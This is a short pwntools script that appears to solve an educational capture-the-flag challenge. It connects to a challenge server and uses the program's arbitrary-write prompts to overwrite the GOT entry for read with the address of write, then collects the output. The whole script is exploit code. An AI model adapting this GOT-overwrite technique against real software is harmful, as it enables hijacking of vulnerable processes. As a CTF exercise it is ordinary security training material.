from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = remote( 'edu-ctf.zoolab.org', 10004 )
#p = process('./chal')

p.recvuntil('Overwrite addr: ')

read_got = 0x404038
write = 0x4010c0

p.sendline( str( read_got ) )

p.recvuntil("Overwrite 8 bytes value: ")
p.send( p64( write ) )

# gdb.attach(p)
p.recvall()

